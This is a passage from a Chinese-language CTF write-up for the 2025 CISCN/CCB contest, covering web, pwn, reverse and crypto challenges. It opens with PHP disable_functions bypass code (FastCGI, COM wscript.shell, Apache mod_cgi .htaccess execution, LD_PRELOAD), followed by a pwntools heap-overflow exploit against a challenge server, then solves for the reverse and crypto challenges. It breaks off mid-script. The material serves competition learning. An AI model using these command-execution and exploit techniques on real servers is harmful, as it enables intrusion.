md5(<span class="name">"e"</span>);;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $input = $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        $result = substr(<span class="name">$<span class="built_in">input</span></span>, strlen(<span class="name">$start</span>)+strpos(<span class="name">$<span class="built_in">input</span></span>, $start),(<span class="name">strlen</span>(<span class="name">$<span class="built_in">input</span></span>) - strpos(<span class="name">$<span class="built_in">input</span></span>, $end))*(<span class="name">-1</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $result;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//var_dump(<span class="name">fastcgi_exec</span>(<span class="name">"id"</span>,<span class="string">'/var/www/html/shell.php'</span> , <span class="string">'127.0.0.1'</span>, <span class="number">9002</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo fastcgi_exec(<span class="name">"id"</span>,<span class="string">'/var/www/html/ant.php'</span> , <span class="string">'unix:///run/php/php7.3-fpm.sock'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//var_dump(<span class="name">fastcgi_exec</span>(<span class="name">"whoami"</span>,<span class="string">'C:\\phpstudy2018\\PHPTutorial\\WWW\test\\apache\\1.php'</span> , <span class="string">'127.0.0.1'</span>, <span class="number">9000</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * COM执行: 仅限windows</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * work on:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * php <span class="number">5.4</span>.45</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * *******</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * fail:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * &gt; php <span class="number">5.5</span>.38</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function com_exec(<span class="name">$cmd</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = <span class="string">"cmd.exe /c "</span>.$cmd;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd_arr = send_cmd(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo <span class="string">"执行时候会黑框, 需要时间; 如果有延时命令执行的时候特别需要注意一下。"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $wscript = new COM(<span class="name">'wscript.shell'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $wscript-&gt;Run(<span class="name">$cmd_arr</span>[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    sleep(<span class="name">1</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo com_exec(<span class="name">$_GET</span>['cmd']);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * Apache mod-cgi: Windows &amp;&amp; Linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 需要保证一个web目录可写可访问</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 注意备份htaccess</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function apache_cgi_exec(<span class="name">$cmd</span>, <span class="attr">$dir</span>=<span class="string">'.'</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo <span class="string">"由于是系统调用cmd执行后命令，会有一些延迟。请新建目录执行, 以免htaccess出问题导致本身shell不可访问。"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    // check</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    if(!<span class="name">in_array</span>(<span class="name">'mod_cgi'</span>, apache_get_modules()) &amp;&amp; !empty(<span class="name">$_SERVER</span>['HTACCESS']) &amp;&amp; is_writable(<span class="name">$dir</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd_arr = send_cmd(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">OS</span> == <span class="string">"Windows"</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $shell_file = <span class="string">"bye.bat"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $htaccess = <span class="string">"ScriptInterpreterSource Registry-Strict\nAddHandler cgi-script .bat\nOptions +ExecCGI +FollowSymlinks"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd_arr[0] = escapeshellcmd(<span class="name">$cmd_arr</span>[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">"@echo off\necho Content-Type: text/html\nfor /F %%i in ('$cmd_arr[0]') do ( set result=%%i)"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $shell_file = <span class="string">"1.bylinux"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $htaccess = <span class="string">"Options +ExecCGI\nAddHandler cgi-script .bylinux"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">"#!/bin/bash\necho \"Content-Type: text/html\\n\\n\"\n"</span> . $cmd_arr[0];</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    write_file(<span class="name">'.htaccess'</span>, $htaccess);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    write_file(<span class="name">$shell_file</span>, $content);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo <span class="string">"&lt;img src = '$shell_file' style = 'display:none;'&gt;"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    sleep(<span class="name">1</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo ld_preload_exec_cmd(<span class="name">'cat /run/log/d8ba573026fb028f7cf59218bafb6df3/flag'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">)}}</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/images/2025CISCN-CCB/9.png"></p>
<h2 id="pwn">Pwn</h2>
<h3 id="note"><strong>note</strong></h3>
<blockquote>
<p>放入ida，看一下程序逻辑</p>
</blockquote>
<blockquote>
<p>重命名一下，看见了amenu函数</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/10.png"></p>
<blockquote>
<p>不同的选项，对应不同的功能，后续分析要用</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/11.png"></p>
<blockquote>
<p>不同的分支，对应不同的功能，则可以定位到不同的功能分支。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/12.png"></p>
<p>观察new部分</p>
<p>分析可以知道，chunk的第一个元素被赋值为函数指针，因此根据c++一堆函数指针调用函数的特性，完全可以从此处入手，分析是否有机会可以覆盖函数指针，然后调用我们自己的函数，接下来的问题就是不知道有没有后门函数</p>
<p>：可以找到一个后门，下面就可以考虑覆盖函数指针，使其指向此函数即可。</p>
<p><img src="/images/2025CISCN-CCB/13.png"></p>
<p><img src="/images/2025CISCN-CCB/14.png"></p>
<p><img src="/images/2025CISCN-CCB/15.png"></p>
<p><img src="/images/2025CISCN-CCB/16.png"></p>
<p>接着可以分析edit：</p>
<p>存在溢出：</p>
<p><img src="/images/2025CISCN-CCB/17.png"></p>
<blockquote>
<p>可以溢出到下一个chunk的函数指针。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/18.png"></p>
<blockquote>
<p>之后会调用此函数指针指向的函数</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/19.png"></p>
<blockquote>
<p>思路现在就清晰了，可以申请两个chunk，通过上一个覆盖下一个chunk的函数指针，使其指向我们的后门函数即可。但是现在的问题是如何找到指向后门的指针，观察show函数的时候就会知道需要我们在heap中填入后门地址，那么heap的指针就成为了指向后门的指针。</p>
</blockquote>
<blockquote>
<p>由于我们还没有看show函数，思路到这里就卡住了，无法获得一个指向后门的函数指针。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/20.png"></p>
<blockquote>
<p>有个gift会输出意想不到的东西。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/21.png"></p>
<blockquote>
<p>会输出chunk的地址：</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/22.png"></p>
<blockquote>
<p>现在我们就知道堆地址了，</p>
<p>我们就可以利用了：代码如下：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process("./note")</span></span><br><span class="line">io = remote(<span class="string">"47.94.109.203"</span>,<span class="number">24867</span>)</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'1'</span>)</span><br><span class="line"><span class="comment">###show</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"index: "</span>,<span class="string">b'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">heapadd = io.recvline()</span><br><span class="line">heapadd = <span class="built_in">int</span>(heapadd,<span class="number">16</span>)</span><br><span class="line">binptr = heapadd + <span class="number">0x9418ff8</span>-<span class="number">0x9419010</span>-<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapadd))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">###show</span></span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'3'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"index: "</span>,<span class="string">b'0'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"len: "</span>,<span class="string">b'28'</span>)</span><br><span class="line"><span class="comment">#payload = 7*p32(0x080489CE)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b"content: "</span>,<span class="number">5</span>*p32(<span class="number">0x080489CE</span>)+p32(<span class="number">0x21</span>)+p32(binptr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'3'</span>)</span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line">io.sendlineafter(<span class="string">b"index: "</span>,<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b"len: "</span>,<span class="string">b'32'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"content: "</span>,<span class="string">b'aaa'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="reverse">Reverse</h2>
<h3 id="dump">dump</h3>
<p>题目里有两个文件，一个是十六进制文件，一个是exe文件。打开十六进制文件，先保存数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">23291e24380</span>e1520370e0520000e37121d0f24010139</span><br></pre></td></tr></table></figure>
<p>使用IDA打开程序，发现main里就是逻辑。这里的argv[1]就是我们的输入</p>
<p><img src="/images/2025CISCN-CCB/23.png"></p>
<p>经过动态调试，下断点，调试后发现这里是对输入做变换，然后打印出来。</p>
<p><img src="/images/2025CISCN-CCB/24.png"></p>
<p>输入flag{1234567890}:输出如下图所示，f是23，之后的数字是后续。</p>
<p><img src="/images/2025CISCN-CCB/25.png"></p>
<p><img src="/images/2025CISCN-CCB/26.png"></p>
<p>观察上述数据和十六进制文件的关系，因为一直没看到有对文件进行操作，所以这里比较疑惑。然后比较的时候可以发现前面的数值是雷同的。</p>
<p>多试了几次，发现每个字符对应编码出来的值是一样的。互相之间是独立计算的。所以使用python的库：from
string import printable。对里面的字符打印出来，做成一张表来对应。</p>
<p>其中有些字符是0，没有对应的值，打出来数字1和2是有对应值的，2以后都不行，都是0。同时提示说了长度和第13位。因为0有很多可能，根据提示能知道，这一位是4。根据表可得flag</p>
<p><img src="/images/2025CISCN-CCB/27.png"></p>
<p>最终打表可得：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">flag{      M  T   c  z  M  D  c  4  M  z  Q  2  N  g =  =  }</span></span><br><span class="line"><span class="string">23291e2438 0e 15 20 37 0e 05 20 00 0e 37 12 1d 0f 24 01 01 39</span></span><br><span class="line"><span class="string">1 2 3 4 5  6  7  8  9  10 11 12 13 14 15</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a   b c   d  e  f  g  h  i  j  k l   m  n  o  p  q  r s  t   u   v   w  x  y  z  1  2</span></span><br><span class="line"><span class="comment"># 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32  33  34 35 36 37 1c 1d</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A   B  C  D  E  F  G  H  I J  K  L  M  N  O  P  Q  R  S   T  U  V W   X  Y Z</span></span><br><span class="line"><span class="comment"># 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="built_in">print</span>(tmp,end=<span class="string">""</span>)</span><br><span class="line"><span class="comment">#flag{MTczMDc4MzQ2Ng==}</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/2025CISCN-CCB/28.png"></p>
<h2 id="crypto">Crypto</h2>
<h3 id="fffffhash">fffffhash</h3>
<p>分析0x0000000001000000000000000000013b这一串数字，在网上查找</p>
<p>发现这是128位的FNV哈希的一个参数，在网上搜索FNV相关的知识，结果搜到了类似的题目（64位FNV）</p>
<p><img src="/images/2025CISCN-CCB/29.png"></p>
<p>然后将解题脚本稍微修改了一下，就跑出来了</p>
<p>py脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">TARGET = <span class="number">201431453607244229943761366749810895688</span></span><br><span class="line">h0 = <span class="number">0x6c62272e07bb014262b821756295c58d</span></span><br><span class="line">p = <span class="number">0x0000000001000000000000000000013b</span></span><br><span class="line">MOD = <span class="number">2</span>^<span class="number">128</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">30</span></span><br><span class="line">M = Matrix.column([p^(n - i - <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)] + [-(TARGET - h0*p^n), MOD])</span><br><span class="line">M = M.augment(identity_matrix(n+<span class="number">1</span>).stack(vector([<span class="number">0</span>] * (n+<span class="number">1</span>))))</span><br><span class="line">Q = Matrix.diagonal([<span class="number">2</span>^<span class="number">128</span>] + [<span class="number">2</span>^<span class="number">4</span>] * n + [<span class="number">2</span>^<span class="number">8</span>])</span><br><span class="line">M *= Q</span><br><span class="line">M = M.BKZ()</span><br><span class="line">M /= Q</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> M:</span><br><span class="line">    <span class="keyword">if</span> r[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">abs</span>(r[-<span class="number">1</span>]) == <span class="number">1</span>:</span><br><span class="line">        r *= r[-<span class="number">1</span>]</span><br><span class="line">        good = r[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(good)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">inp = []</span><br><span class="line">y = <span class="built_in">int</span>(h0*p)</span><br><span class="line">t = (h0*p^n + good[<span class="number">0</span>] * p^(n-<span class="number">1</span>)) % MOD</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        y_ = (<span class="built_in">int</span>(y) ^^ <span class="built_in">int</span>(x)) * p^(n-i-<span class="number">1</span>) % MOD</span><br><span class="line">        <span class="keyword">if</span> y_ == t:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'good'</span>, i, x)</span><br><span class="line">            inp.append(x)</span><br><span class="line">            <span class="keyword">if</span> i &lt; n-<span class="number">1</span>:</span><br><span class="line">                t = (t + good[i+<span class="number">1</span>] * p^(n-i-<span class="number">2</span>)) % MOD</span><br><span class="line">                y = ((<span class="built_in">int</span>(y) ^^ <span class="built_in">int</span>(x)) * p) % MOD</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'bad'</span>, i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(inp).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
<p>跑出来的结果：</p>
<p><img src="/images/2025CISCN-CCB/30.png"></p>
<p>所以得到了我们的hex_string</p>
<p>然后nc交互就可以了，如下所示：</p>
<p><img src="/images/2025CISCN-CCB/31.png"></p>
<p>flag{508074eb-ea1b-4608-9bdb-64e6d73e2655}</p>
<h3 id="rasnd">rasnd</h3>
<p>两个部分的拼凑</p>
<p>第一部分是前段时间强网杯的apdq的第二部分，直接套板子就出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part1</span></span><br><span class="line">n=<span class="number">28887811227499051616528094429019003663717623904277565919075044655116848454702243443222138650839802532457876075543066292240383592982003544521377684917140524085713240851320087700637160892340521450393565882070831401986253770658662871222156018676508909050373444215149175943226203798935993199035325044630185976663003232467964487143314972938428288758994373432653784346882713174719140391514347600850788886148311039655932116903027672113333591490675960703395369201502464526771460999324722209109938614286150245265511899004435237837454069138941745952479175479274675250566087400534051161079388742074574161312192043701412913886879</span></span><br><span class="line">c=<span class="number">12904862358252536205392970372996437799373602343641649800438666554968935383265314461895472296763366221390375513224953980022691144110127251816378756979174253143874738105909473714409576815667746200188582929727948993200023081398594917163571324435295811041599701791670116306237799243786230718765077662418219690489181151068715116557561366214233881032505810402132893400971807723389883203848637967177002497144918823825923464608185799494223184876201542806244059208328032164925668486389879511335562451730919596497353207496613303380375801193934636085352103680453435947151045227281898926345875209127168252450738017665556659823293</span></span><br><span class="line">hint1=<span class="number">377177973587575850466901754568881568812740281610024306026199181684494762091512999340415335806051052710588140980770351324449498146395095691664930883421912024544523884628292027615631463699276645005996099180207059939697896427175045969513335989186018906424156601382567472008947296866700129244023038476994696464956187676767165999552159908068623501</span>+<span class="number">0x114</span></span><br><span class="line">hint2=<span class="number">7181804289463325714939537449620677120608402749084085104997954266645742337112146883176759025627406327132463813893784187427062727563053446288300954407999801433816793840360522607395887308951891396620953517561723843530407447008241903967390660485941935151813958917072982711483327150689765967737844070049797477796050409421814053857382004868595748173297461069739232023287436317552899867260535988259736223827987858334777288892948771592938879108032542724655660055953059782</span>+<span class="number">0x514</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="comment">#from Crypto.Util.number import long_to_bytes</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(itertools.product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>))):</span><br><span class="line">    kq = gcd(a1 * hint1 - a2 * hint2, n)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kq &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'find!'</span>, kq, a1, a2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> kq % i == <span class="number">0</span>:</span><br><span class="line">        kq //= i</span><br><span class="line">q = kq</span><br><span class="line">p = n // kq</span><br><span class="line">d = <span class="built_in">pow</span>(<span class="number">0x10001</span>, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
<p>解得d后正常解密即可</p>
<p><img src="/images/2025CISCN-CCB/32.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">d=<span class="number">23907366912691968835577624634040812376408997746619567882551723026751722332211426825663096512569223640927266774269570312320275955813630594133855423265267982137737686456412391728445890603457057882210754631914151602620358454201207818626841297907693214658500615947346704988154826153877815571803377630508751194016044821159736834012130046315763891301572528300800270589349185383179339008172340480814901009286441308922386924830307903892751895522131345775410180999796185964203138795696737875885592819391495282427460200856076157745310030154909372824593618530916342795687746095429297760084659027083995509824303304962460646012273</span></span><br><span class="line">c=<span class="number">12904862358252536205392970372996437799373602343641649800438666554968935383265314461895472296763366221390375513224953980022691144110127251816378756979174253143874738105909473714409576815667746200188582929727948993200023081398594917163571324435295811041599701791670116306237799243786230718765077662418219690489181151068715116557561366214233881032505810402132893400971807723389883203848637967177002497144918823825923464608185799494223184876201542806244059208328032164925668486389879511335562451730919596497353207496613303380375801193934636085352103680453435947151045227281898926345875209127168252450738017665556659823293</span></span><br><span class="line">n=<span class="number">28887811227499051616528094429019003663717623904277565919075044655116848454702243443222138650839802532457876075543066292240383592982003544521377684917140524085713240851320087700637160892340521450393565882070831401986253770658662871222156018676508909050373444215149175943226203798935993199035325044630185976663003232467964487143314972938428288758994373432653784346882713174719140391514347600850788886148311039655932116903027672113333591490675960703395369201502464526771460999324722209109938614286150245265511899004435237837454069138941745952479175479274675250566087400534051161079388742074574161312192043701412913886879</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b'flag{7f33cdc8-da19-'</span></span><br></pre></td></tr></table></figure>
<p>然后第二部分，就是DUCTF2020的EasyRSA，修改一下数字就可以了</p>
<p>https://crypto-writeup-public.hatenablog.com/entry/DownUnderCTF%25202020%2520%257C%2520%2520%2520babyRSA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part2</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.solvers <span class="keyword">import</span> solve</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols</span><br><span class="line">n=<span class="number">16235562199200267459663730571049431604560323138825891010565012084966378560657028557593713658149224124014019674718841338098341965331592933997415694692050656493911264929774020942179882196570321425270890223396169112762011033004564308723485972391649681397363565727449598074059933122020979277213051522292750681766691422016751120287403039252908062651404902039208868924707593108364706700085611092189177151362213092719343563439787881931506466123650653478905555329561874204870585566987658878227630910823854130181333087408403245083629898953751267545552289595198873283690722202122622106505732576237684209082112223769923295430523</span></span><br><span class="line">c=<span 